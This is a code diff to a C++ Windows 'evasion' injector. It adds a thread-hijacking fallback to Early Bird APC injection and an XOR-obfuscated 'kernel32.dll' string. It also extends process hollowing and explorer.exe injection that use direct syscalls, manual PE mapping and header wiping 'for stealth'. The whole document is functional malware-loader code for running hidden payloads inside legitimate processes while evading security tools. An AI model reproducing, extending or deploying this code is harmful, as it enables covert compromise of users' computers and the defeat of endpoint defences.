@@ -11,6 +11,16 @@
 
 namespace evasion {
 
+namespace {
+    // "kernel32.dll"
+    std::string kKernel32 = "\x31\x3F\x28\x34\x3F\x36\x69\x68\x74\x3E\x36\x36";
+
+    struct RELOC_ENTRY {
+        WORD Offset : 12;
+        WORD Type : 4;
+    };
+}
+
 bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
@@ -21,7 +31,10 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
 
     // 1. Alloc RW via syscall
     NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!NT_SUCCESS(status)) return false;
+    if (!NT_SUCCESS(status)) {
+        LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex(status));
+        return false;
+    }
 
     // 2. Map & Reloc locally
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
@@ -55,8 +68,11 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    // 3. Write via syscall
-    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) return false;
+    // 3. Write fixed image via syscall
+    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
+        LOG_ERR("MapAndInject: NtWriteVirtualMemory fail.");
+        return false;
+    }
 
     // 4. Wipe Headers for stealth
     std::vector<uint8_t> zeroHeader(pNtHeaders->OptionalHeader.SizeOfHeaders, 0);
@@ -66,9 +82,39 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     DWORD oldProt;
     PVOID pProtBase = pTargetBase;
     SIZE_T protSize = pNtHeaders->OptionalHeader.SizeOfImage;
-    if (!NT_SUCCESS(SysNtProtectVirtualMemory(hProcess, &pProtBase, &protSize, PAGE_EXECUTE_READ, &oldProt))) return false;
+    if (!NT_SUCCESS(SysNtProtectVirtualMemory(hProcess, &pProtBase, &protSize, PAGE_EXECUTE_READ, &oldProt))) {
+        LOG_ERR("MapAndInject: NtProtectVirtualMemory fail.");
+        return false;
+    }
 
     if (ppRemoteBase) *ppRemoteBase = pTargetBase;
+    return true;
+}
+
+bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;
+
+    if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
+        SysNtResumeThread(hThread, NULL);
+        return false;
+    }
+
+#ifdef _M_AMD64
+    ctx.Rip = (DWORD64)pEntryPoint;
+#else
+    ctx.Eip = (DWORD)pEntryPoint;
+#endif
+
+    if (!NT_SUCCESS(SysNtSetContextThread(hThread, &ctx))) {
+        SysNtResumeThread(hThread, NULL);
+        return false;
+    }
+
+    LOG_INFO("Thread hijacked successfully.");
+    SysNtResumeThread(hThread, NULL);
     return true;
 }
 
@@ -76,7 +122,10 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
     STARTUPINFOW si; PROCESS_INFORMATION pi;
     RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
 
-    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return false;
+    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        LOG_ERR("HollowProcess: CreateProcessW fail. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     PVOID pRemoteBase = NULL;
     if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
@@ -88,21 +137,25 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
     PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    // 6. Early Bird APC Injection via syscall
-    // This is much stealthier than CreateRemoteThread
+    // Try Early Bird APC
     NTSTATUS status = SysNtQueueApcThreadEx(pi.hThread, NULL, pEntryPoint, NULL, NULL, NULL);
 
     if (NT_SUCCESS(status)) {
-        LOG_INFO("HollowProcess: Early Bird APC queued.");
+        LOG_INFO("HollowProcess: Early Bird APC success.");
         SysNtResumeThread(pi.hThread, NULL);
     } else {
-        LOG_ERR("HollowProcess: NtQueueApcThreadEx fail. Status: " + utils::Shared::ToHex(status));
-        TerminateProcess(pi.hProcess, 0);
+        LOG_WARN("HollowProcess: APC fail. Trying Thread Hijacking.");
+        if (HijackThread(pi.hThread, pEntryPoint)) {
+             LOG_INFO("HollowProcess: Hijack success.");
+        } else {
+             LOG_ERR("HollowProcess: Hijack fail.");
+             TerminateProcess(pi.hProcess, 0);
+        }
     }
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    return NT_SUCCESS(status);
+    return true;
 }
 
 DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
@@ -113,9 +166,9 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
         if (Process32FirstW(hSnapshot, &pe)) {
             do {
                 std::wstring currentProcess = pe.szExeFile;
-                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
                 std::wstring targetProcess = processName;
-                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
                 if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
             } while (Process32NextW(hSnapshot, &pe));
         }
@@ -130,9 +183,15 @@ bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std
     DWORD pid = GetProcessIdByName(explorer);
     if (pid == 0) return false;
 
-    // We prefer HollowProcess for stealth in 2026, but if we must inject into existing:
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
+    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME, FALSE, pid);
+    if (!hProcess) {
+        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    }
+
+    if (!hProcess) {
+        LOG_ERR("Inject: Open explorer fail. Error: " + std::to_string(GetLastError()));
+        return false;
+    }
 
     PVOID pRemoteBase = NULL;
     bool success = MapAndInject(hProcess, payload, &pRemoteBase);
@@ -143,17 +202,17 @@ bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
         PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-        // Try APC on a random thread in explorer
+        // Try Hijacking a thread in explorer
         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (hSnap != INVALID_HANDLE_VALUE) {
             THREADENTRY32 te; te.dwSize = sizeof(te);
             if (Thread32First(hSnap, &te)) {
                 do {
                     if (te.th32OwnerProcessID == pid) {
-                        HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                        HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                         if (hT) {
-                            if (NT_SUCCESS(SysNtQueueApcThreadEx(hT, NULL, pEntryPoint, NULL, NULL, NULL))) {
-                                LOG_INFO("InjectIntoExplorer: APC queued to " + std::to_string(te.th32ThreadID));
+                            if (HijackThread(hT, pEntryPoint)) {
+                                LOG_INFO("InjectIntoExplorer: Hijack success on thread " + std::to_string(te.th32ThreadID));
                                 CloseHandle(hT); break;
                             }
                             CloseHandle(hT);
